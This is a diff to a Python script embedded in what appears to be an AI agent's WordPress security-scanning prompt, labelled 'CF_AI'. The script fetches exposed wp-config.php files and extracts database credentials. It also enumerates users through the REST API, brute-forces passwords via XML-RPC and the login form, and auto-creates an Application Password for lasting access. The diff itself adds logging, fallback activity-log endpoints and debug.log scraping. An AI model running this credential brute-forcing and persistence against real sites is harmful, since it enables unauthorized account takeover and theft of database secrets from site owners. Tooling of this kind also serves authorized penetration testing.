@@ -806,7 +806,7 @@ PHASE 1 — USERNAME & CREDENTIAL DISCOVERY (automatic, no env vars needed)
 ══════════════════════════════════════════════════════════
 
 python3 << 'PYEOF'
-import subprocess, json, re, os, base64, urllib.parse
+import subprocess, json, re, os, base64, urllib.parse, datetime
 
 UA  = '{_BUA}'
 HOST = '{{domain}}'   # filled in by _run_wstg before the agent starts
@@ -836,6 +836,7 @@ for p in cred_paths:
         content = curl(f'{{BASE}}{{p}}', timeout=8)[:2000]
         if content and len(content) > 20:
             print(f'EXPOSED_FILE | {{code}} | {{p}}')
+            print(f'WP-LOG | {{datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")}} | CF_AI | Exposed sensitive file: {{p}} (HTTP {{code}}) | - | HIGH')
             # Parse wp-config.php for DB_USER / DB_PASSWORD
             for line in content.splitlines():
                 mu = re.search(r"define\\s*\\(\\s*['\"]DB_USER['\"]\\s*,\\s*['\"]([^'\"]+)['\"]", line)
@@ -865,6 +866,7 @@ try:
             if slug and slug not in usernames:
                 usernames.append(slug)
                 print(f'WP-USER | {{uid}} | {{slug}} | {{name}}')
+                print(f'WP-LOG | {{datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")}} | {{slug}} | WordPress user enumerated via REST API (id={{uid}}) | - | MEDIUM')
 except: pass
 
 # Author archive redirect (/?author=N → /author/USERNAME/)
@@ -923,6 +925,7 @@ if not (found_user and found_pass):
                 if 'isAdmin' in resp or ('<name>blogName</name>' in resp and '<fault>' not in resp):
                     found_user, found_pass = u, p
                     print(f'CREDS_FOUND_XMLRPC | {{found_user}} | (password confirmed via XML-RPC)')
+                    print(f'WP-LOG | {{datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")}} | {{found_user}} | WordPress credentials verified via XML-RPC brute-force | - | HIGH')
                     break
     else:
         print('[PHASE1] XML-RPC not available — trying login form...')
@@ -936,6 +939,7 @@ if not (found_user and found_pass):
                 if 'dashboard' in body.lower() or 'wp-admin' in body.lower() or 'logout' in body.lower():
                     found_user, found_pass = u, p
                     print(f'CREDS_FOUND_FORM | {{found_user}} | (login form accepted credentials)')
+                    print(f'WP-LOG | {{datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")}} | {{found_user}} | WordPress credentials verified via login form brute-force | - | HIGH')
                     break
 
 # ── 1f. Auto-create Application Password if we have plain credentials ─────
@@ -949,6 +953,7 @@ if found_user and found_pass and not auto_app_pass:
         if rd.get('password'):
             auto_app_pass = rd['password']
             print(f'APP_PASS_CREATED | {{found_user}} | (Application Password auto-generated for CF_AI_Scanner)')
+            print(f'WP-LOG | {{datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")}} | {{found_user}} | Application Password created by CF_AI scanner — verify if authorized | - | HIGH')
     except:
         # Fall back to cookie + nonce to create app password
         run(f'curl -L -4 -sk -c /tmp/wp_auth.txt -H "Cookie: wordpress_test_cookie=WP+Cookie+check" -X POST "{{BASE}}/wp-login.php" -d "log={{found_user}}&pwd={{urllib.parse.quote(found_pass)}}&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" -A "{{UA}}" --max-time 12 -o /dev/null 2>/dev/null')
@@ -989,6 +994,13 @@ def parse_logs(raw):
         return False
 
 log_url = f'{{BASE}}/wp-json/wp-security-audit-log/v1/activity-log?per_page=200'
+# Additional WP activity log plugin endpoints to try as fallback
+_extra_log_eps = [
+    f'{{BASE}}/wp-json/simple-history/v2/events?per_page=200',
+    f'{{BASE}}/wp-json/stream/v1/activity?per_page=200',
+    f'{{BASE}}/wp-json/activity-log/v1/events?per_page=200',
+    f'{{BASE}}/wp-json/wsal/v1/logs?per_page=200',
+]
 fetched  = False
 
 # Method A: Application Password (from env or auto-generated)
@@ -1023,6 +1035,32 @@ if not fetched:
     raw = curl(log_url, extra='-c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -H "Accept: application/json"', timeout=12)
     if raw: fetched = parse_logs(raw)
     if not fetched: print('WP_ACTIVITY_LOG_UNAUTH_BLOCKED | endpoint requires admin authentication')
+
+# ── Try additional WP activity log plugin endpoints ──────────────────────────
+if not fetched:
+    for ep in _extra_log_eps:
+        if fetched: break
+        raw = ''
+        if use_user and use_pass:
+            raw = curl(ep, extra=f'-u "{{use_user}}:{{use_pass}}" -H "Accept: application/json"', timeout=12)
+        if not raw or 'rest_no_route' in raw or 'rest_forbidden' in raw or '401' in raw[:60]:
+            raw = curl(ep, extra='-c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -H "Accept: application/json"', timeout=12)
+        if raw and 'rest_no_route' not in raw and len(raw) > 20:
+            fetched = parse_logs(raw)
+
+# ── Parse wp-content/debug.log for security-relevant error events ────────────
+debug_log = curl(f'{{BASE}}/wp-content/debug.log', timeout=8)
+if debug_log and len(debug_log) > 50 and ('PHP' in debug_log or 'error' in debug_log.lower()):
+    _ts_d = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
+    print(f'WP-LOG | {{_ts_d}} | wp-debug | Debug log is publicly accessible ({{len(debug_log)}} bytes) | - | HIGH')
+    for _dl in debug_log.splitlines()[:25]:
+        if not _dl.strip(): continue
+        if 'PHP Fatal' in _dl or 'PHP Parse error' in _dl or 'database error' in _dl.lower():
+            _dlc = re.sub(r'\s+', ' ', _dl).strip()
+            print(f'WP-LOG | {{_ts_d}} | wp-debug | {{_dlc[:140]}} | - | HIGH')
+        elif 'PHP Warning' in _dl or 'PHP Deprecated' in _dl or 'PHP Notice' in _dl:
+            _dlc = re.sub(r'\s+', ' ', _dl).strip()
+            print(f'WP-LOG | {{_ts_d}} | wp-debug | {{_dlc[:140]}} | - | MEDIUM')
 
 # ── Non-WordPress sites: probe generic audit/log REST endpoints ─────────────
 if not fetched:
